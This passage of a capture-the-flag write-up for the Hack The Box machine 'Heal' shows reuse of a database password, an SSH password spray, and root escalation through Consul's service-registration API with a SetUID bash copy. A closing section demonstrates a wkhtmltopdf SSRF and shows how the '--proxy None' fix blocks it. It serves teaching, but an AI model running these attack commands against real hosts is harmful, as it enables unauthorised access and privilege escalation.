|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database|    'tablePrefix' You can add an optional prefix, which will be added    
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(                             
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;d
bname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',               
                        'tablePrefix' => 'lime_',
                ),
...[snip]...

```

I’ll note the password “AdmiDi0\_pA$$w0rd”.

### SSH

#### Password Spray

I’ll make a list of the users on the box with shells and use `netexec` to check if any used that same password:

```

oxdf@hacky$ netexec ssh heal.htb -u users.txt -p 'AdmiDi0_pA$$w0rd' --continue-on-success
SSH         10.10.11.46     22     heal.htb         [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.46     22     heal.htb         [-] root:AdmiDi0_pA$$w0rd
SSH         10.10.11.46     22     heal.htb         [-] ralph:AdmiDi0_pA$$w0rd
SSH         10.10.11.46     22     heal.htb         [+] ron:AdmiDi0_pA$$w0rd  Linux - Shell access!
SSH         10.10.11.46     22     heal.htb         [-] postgres:AdmiDi0_pA$$w0rd

```

There’s a match for ron.

#### Connect

I’ll connect as ron:

```

oxdf@hacky$ sshpass -p 'AdmiDi0_pA$$w0rd' ssh ron@heal.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...[snip]...
ron@heal:~$

```

And grab `user.txt`:

```

ron@heal:~$ cat user.txt
13bb4925************************

```

## Shell as root

### Enumeration

#### Identify Consul

One interesting process is `consul` running as root:

```

www-data@heal:~$ ps auxww
...[snip]...
root        1849  0.7  2.6 1359780 106524 ?      Ssl  May13   9:08 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
...[snip]...

```

There’s also a bunch of TCP ports listening on localhost:

```

www-data@heal:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN

```

These line up nicely with what’s in the [Consul docs](https://developer.hashicorp.com/consul/docs/reference/architecture/ports).

#### Consul Configuration

The `consul` binary is on Heal:

```

www-data@heal:~$ consul 
Usage: consul [--version] [--help] <command> [<args>]

Available commands are:
    acl             Interact with Consul's ACLs
    agent           Runs a Consul agent
    catalog         Interact with the catalog
    config          Interact with Consul's Centralized Configurations
    connect         Interact with Consul Connect
    debug           Records a debugging archive for operators
    event           Fire a new event
    exec            Executes a command on Consul nodes
    force-leave     Forces a member of the cluster to enter the "left" state
    info            Provides debugging information for operators.
    intention       Interact with Connect service intentions
    join            Tell Consul agent to join cluster
    keygen          Generates a new encryption key
    keyring         Manages gossip layer encryption keys
    kv              Interact with the key-value store
    leave           Gracefully leaves the Consul cluster and shuts down
    lock            Execute a command holding a lock
    login           Login to Consul using an auth method
    logout          Destroy a Consul token created with login
    maint           Controls node or service maintenance mode
    members         Lists the members of a Consul cluster
    monitor         Stream logs from a Consul agent
    operator        Provides cluster-level tools for Consul operators
    peering         Create and manage peering connections between Consul clusters
    reload          Triggers the agent to reload configuration files
    resource        Interact with Consul's resources
    rtt             Estimates network round trip time between nodes
    services        Interact with services
    snapshot        Saves, restores and inspects snapshots of Consul server state
    tls             Builtin helpers for creating CAs and certificates
    troubleshoot    CLI tools for troubleshooting Consul service mesh
    validate        Validate config files/directories
    version         Prints the Consul version
    watch           Watch for changes in Consul

```

The configuration is located in `/etc/consul.d/config.json`:

```

{
"bootstrap":true,
"server": true,
"log_level": "DEBUG",
"enable_syslog": true,
"enable_script_checks": true,
"datacenter":"server1",
"addresses": {
        "http":"127.0.0.1"
},
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}

```

The `acl_default_policy` is allow, which means unless there’s an explicit policy somewhere, no auth is required.

The binary shows it’s version 1.19.2:

```

www-data@heal:/etc/consul.d$ consul version      
Consul v1.19.2
Revision 048f1936
Build Date 2024-08-27T16:06:44Z
Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)

```

There are a few services running:

```

ron@heal:~$ consul catalog services
Heal React APP
PostgreSQL
Ruby API service
consul

```

### RCE via Creating Service

In [Ambassador](/2023/01/28/htb-ambassador.html#execution-via-consul), I exploited Consul by having write access to `/etc/consul.d/config.d`, allowing me to drop a configuration file into that directory and then wait for it to load and run.

Here I don’t have that access, so I’ll have to use the REST API to [register a service](https://developer.hashicorp.com/consul/api-docs/agent/service#register-service). I’ll create a JSON file with the information necessary, including a command to create a SetUID / SetGID copy of `bash`:

```

{
  "Name": "0xdf service",
  "ID": "rev-shell",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/0xdf && chmod 6777 /tmp/0xdf"],
      "interval": "30s",
      "timeout": "5s"
  }
}

```

I’ll upload this using the API:

```

ron@heal:/dev/shm$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "Content-Type: application/json" -d @0xdf.json 

```

After less than a minute, it’s there:

```

ron@heal:/dev/shm$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1396520 May 14 18:01 /tmp/0xdf

```

I’ll run it with `-p` to not drop privileges and get a shell as root:

```

ron@heal:/dev/shm$ /tmp/0xdf -p
0xdf-5.1#

```

And the root flag:

```

0xdf-5.1# cat root.txt
938ee85d************************

```

## Beyond Root - wkhtmltopdf SSRF

### CVE-2023-35583

#### Background

Any time something is parsing HTML into another format, there’s a risk for parsing issues, and server-side request forgery (SSRF) vulnerabilities.

[CVE-2023-35583](https://nvd.nist.gov/vuln/detail/CVE-2022-35583) is a vulnerability in the exact version of `wkhtmltopdf` used on Heal:

> wkhtmlTOpdf 0.12.6 is vulnerable to SSRF which allows an attacker to get initial access into the target’s system by injecting iframe tag with initial asset IP address on it’s source. This allows the attacker to takeover the whole infrastructure by accessing their internal assets.

#### Command Line POC

As root, I can run the `wkhtmltopdf` command myself to demonstrate the SSRF:

```

root@heal:~# echo '<iframe src="http://10.10.14.6">' | wkhtmltopdf - test.pdf 
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Printing pages (2/2)                                               
Done  

```

I’m piping the iframe into `wkhtmltopdf`, which is reading from `-` which is standard in. There’s a hit at my Python webserver:

```
10.10.11.46 - - [14/May/2025 23:17:51] "GET / HTTP/1.1" 200 -

```

### Website SSRF

#### Initial State Fail

Given that, it seems like I should be able to add an `iframe` tag to the submitted HTML to the `/exports` endpoint and get SSRF. But it fails:

![image-20250514154624224](/img/image-20250514154624224.png)

This crashes the request, there’s no PDF generated, and no requests at my webserver.

#### Code Analysis

The code that handles the `/exports` request is in `/home/ralph/resume_api/app/controllers/exports_controller.rb`, here:

```

class ExportsController < ApplicationController
  before_action :authorize_request

  def create
    html_content = params[:content]
    format = params[:format] || 'png'
    css_path = Rails.root.join('app', 'assets', 'stylesheets', 'styles.css').to_s

    filename = "#{SecureRandom.hex(10)}.#{format}"
    filepath = Rails.root.join('private', 'exports', filename)

    if format == 'pdf'
      generate_pdf(html_content, filepath, css_path)
    else
      generate_png(html_content, filepath, css_path)
    end

    render json: { message: "#{format.upcase} created successfully", filename: filename }, status: :created
  end

```

Later in the file, `generate_pdf` is defined:

```

  def generate_pdf(html_content, filepath, css_path)
    command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
    Open3.popen3(command) do |stdin, stdout, stderr, wait_thr|
      stdin.write(html_content)
      stdin.close

      exit_status = wait_thr.value
      unless exit_status.success?
        raise "Error generating PDF: #{stderr.read}"
      end
    end
  end

```

It is calling `wkhtmltopdf`, with a couple more options. It seems very unlikely that the stylesheet is causing issues. So I’ll focus on `--proxy None`.

#### Proxy None

If I try to run this at the command line, it fails as well with no hits on my webserver:

```

root@heal:~# echo '<iframe src="http://10.10.14.6">' | wkhtmltopdf --proxy None - test.pdf 
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Error: Failed to load http://10.10.14.6/, with network status code 3 and http status code 0 - Host None not found
Printing pages (2/2)                                               
Done                                                           
Exit with code 1 due to network error: HostNotFoundError

```

It says that it fails to load the page, and includes “Host None not found”. I believe it’s trying to do a DNS lookup for None and failing, and then it can’t get to the proxy so it just gives up.

If I change it to `oxdf`, it fails the same way:

```

root@heal:~# echo '<iframe src="http://10.10.14.6">' | wkhtmltopdf --proxy oxdf - test.pdf 
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Error: Failed to load http://10.10.14.6/, with network status code 3 and http status code 0 - Host oxdf not found
Printing pages (2/2)                                               
Done                                                           
Exit with code 1 due to network error: HostNotFoundError

```

If I add None to the `/etc/hosts` file on Heal to resolve to my IP:

```
127.0.0.1 localhost heal.htb api.heal.htb take-survey.heal.htb
127.0.1.1 heal
10.10.14.6 None

```

And then run:

```

root@heal:~# echo '<iframe src="http://10.10.14.6">' | wkhtmltopdf --proxy None - test.pdf 
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Error: Failed to load http://10.10.14.6/, with network status code 1 and http status code 0 - Connection refused
Printing pages (2/2)                                               
Done                                                           
Exit with code 1 due to network error: ConnectionRefusedError

```

In Wireshark I’ll see it try to connect on TCP 1080:

![image-20250514155431434](/img/image-20250514155431434.png)

I’m not listening on 1080, so it fails.

#### Make App Vulnerable

To put the full theory to the test, I’ll edit the Ruby source for the app for the `generate_pdf` function:

```

  def generate_pdf(html_content, filepath, css_path)
    #command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
    command = "wkhtmltopdf --user-style-sheet #{css_path} - #{filepath}"
    Open3.popen3(command) do |stdin, stdout, stderr, wait_thr|
      stdin.write(html_content)
      stdin.close

      exit_status = wait_thr.value
      unless exit_status.success?
        raise "Error generating PDF: #{stderr.read}"
      end
    end
  end

```

The service responsible for the API is called `run_api`, so I’ll restart it:

```

root@heal:~# service run_api restart

```

Now back in Repeater, the same request returns a 201 Created:

![image-20250514155654542](/img/image-20250514155654542.png)

And there’s a hit on my server:

```
10.10.11.46 - - [14/May/2025 23:33:48] "GET / HTTP/1.1" 200 -

```

### Implications

In talking to the team that tested this box at HTB, the SSRF was something the testers identified in testing and `--proxy None` was put in place before release.

So what could I have done had they missed it? I don’t think there’s a real practical attack here. I could start to enumerate Consul, but to get RCE from it, I’d need a PUT request, which doesn’t come from just having the server fetch a page.

I feel like I should be able to at least fuzz for open ports, but I couldn’t get it to work in a reasonable way:

```

oxdf@hacky$ ffuf -u http://api.heal.htb/exports -d '{"content":"<iframe src=http://127.0.0.1:FUZZ>","format":"pdf"}' -H "Content-Type: application/json" -w <( seq 1 10000) -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ" -mc 201

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://api.heal.htb/exports
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Content-Type: application/json
 :: Header           : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ
 :: Data             : {"content":"<iframe src=http://127.0.0.1:FUZZ>","format":"pdf"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 201
________________________________________________

11                      [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 900ms]
13                      [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 1096ms]
22                      [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 1498ms]
1                       [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 1802ms]
7                       [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 2140ms]
15                      [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 2351ms]
101                     [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 2350ms]
113                     [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 2425ms]
514                     [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 2413ms]
2049                    [Status: 201, Size: 76, Words: 3, Lines: 1, Duration: 5894ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

I would think that only open ports would return 201 (the others 500).

I think it’s good that the testing team caught this, and saved players a potentially frustrating rabbit hole.